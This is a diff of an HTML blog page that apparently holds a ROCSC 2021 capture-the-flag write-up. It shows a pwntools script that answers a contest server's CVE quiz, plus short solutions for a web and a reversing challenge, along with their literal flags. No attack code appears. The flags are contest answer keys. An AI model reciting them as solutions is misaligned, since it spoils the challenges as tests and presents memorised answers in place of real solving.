-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        json_cve<span class="token punctuation">(</span><span class="token string">"nvdcve-1.1-2019.json"</span><span class="token punctuation">)</span>
-        json_cve<span class="token punctuation">(</span><span class="token string">"nvdcve-1.1-2020.json"</span><span class="token punctuation">)</span>
-        json_cve<span class="token punctuation">(</span><span class="token string">"nvdcve-1.1-2021.json"</span><span class="token punctuation">)</span>
+def main():
+        json_cve(&quot;nvdcve-1.1-2019.json&quot;)
+        json_cve(&quot;nvdcve-1.1-2020.json&quot;)
+        json_cve(&quot;nvdcve-1.1-2021.json&quot;)
 
-        i <span class="token operator">=</span> <span class="token number">1</span>
-        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"34.107.45.139"</span><span class="token punctuation">,</span> <span class="token number">32403</span><span class="token punctuation">)</span>
-        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-                i <span class="token operator">+=</span> <span class="token number">1</span>
-                content <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                content <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>
+        i &#x3D; 1
+        r &#x3D; remote(&quot;34.107.45.139&quot;, 32403)
+        while True:
+                i +&#x3D; 1
+                content &#x3D; r.recvline()
+                content &#x3D; content.decode().strip(&quot;\r\n&quot;)
 
-                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"bye"</span> <span class="token keyword">in</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-                        <span class="token keyword">break</span>
-                cve <span class="token operator">=</span> search<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"CTF&#123;"</span> <span class="token keyword">in</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-                        <span class="token keyword">break</span>
+                if(&quot;bye&quot; in content):
+                        print(content)
+                        break
+                cve &#x3D; search(content)
+                if(&quot;CTF&#123;&quot; in content):
+                        print(content)
+                        break
 
-                <span class="token comment">#content = r.recvuntil(b"What do you think:")</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
-                r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What do you think:"</span><span class="token punctuation">,</span> cve<span class="token punctuation">)</span>
-        r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                #content &#x3D; r.recvuntil(b&quot;What do you think:&quot;)
+                print(content, i)
+                r.sendlineafter(&quot;What do you think:&quot;, cve)
+        r.close()
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-                main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+        while True:
+                main()</code></pre>
 
 <h2 id="ultra-crawl-210-Web"><a href="#ultra-crawl-210-Web" class="headerlink" title="ultra-crawl(210): Web"></a>ultra-crawl(210): Web</h2><h4 id="Proof-of-Flag-14"><a href="#Proof-of-Flag-14" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>ctf{d8b7e522b0ab04101e78ab1c6ff68c4cb2f30ce9d4427d4cd77bc19238367933}</p>
 <h4 id="Summary-14"><a href="#Summary-14" class="headerlink" title="Summary"></a>Summary</h4><p>We get a webserver with crawling functionality.</p>
@@ -559,4 +559,4 @@ db <span class="token operator">=</span> <span class="token punctuation">&#123;<
 
 <h2 id="el-picasso-150-Rev"><a href="#el-picasso-150-Rev" class="headerlink" title="el-picasso(150): Rev"></a>el-picasso(150): Rev</h2><h4 id="Proof-of-Flag-15"><a href="#Proof-of-Flag-15" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>ctf{1ff757b6b99229db80a208563aa98dfb5e4a592b34551ba44b63038c7bd442af}</p>
 <h4 id="Summary-15"><a href="#Summary-15" class="headerlink" title="Summary"></a>Summary</h4><p>We get an executable that we need to reverse.<br>When we try to disassemble it with <strong>IDA</strong> we can see that we get an error.<br>After searching the error on google we can see that there could be a problem with the <strong>nodes</strong><br>We go to Options-&gt;General-&gt;Graph and modify the nodes to a bigger number.<br>And we get a QR on Graph View.<br>We can it via QRScanner from IPhone and we get the flag.</p>
-<h4 id="Proof-of-Solving-15"><a href="#Proof-of-Solving-15" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><img src="/2021/12/08/rocsc-2021/20210830151515.png" class=""></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/12/09/secret/" title="Secret"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Secret</span></a><a class="button is-default" href="/2021/12/08/horizontall/" title="Horizontall"><span class="has-text-weight-semibold">Next: Horizontall</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+<h4 id="Proof-of-Solving-15"><a href="#Proof-of-Solving-15" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><img src="/2021/12/08/rocsc-2021/20210830151515.png" class=""></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/12/09/secret/" title="Secret"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Secret</span></a><a class="button is-default" href="/2021/12/08/horizontall/" title="Horizontall"><span class="has-text-weight-semibold">Next: Horizontall</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article><article class="mt-6 comment-container" id="vcomments"></article><div id="disqus_thread"></div><article class="mt-6 comment-container" id="disqus"><script>var disqus_config = function () {this.page.url = 'null/2021/12/08/rocsc-2021/';this.page.identifier = 'null';};</script><script>(function() {var d = document, s = d.createElement('script');s.src = 'https://null.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s);})();</script><script id="dsq-count-scr" src="//blog-pubgj2togw.disqus.com/count.js" async></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
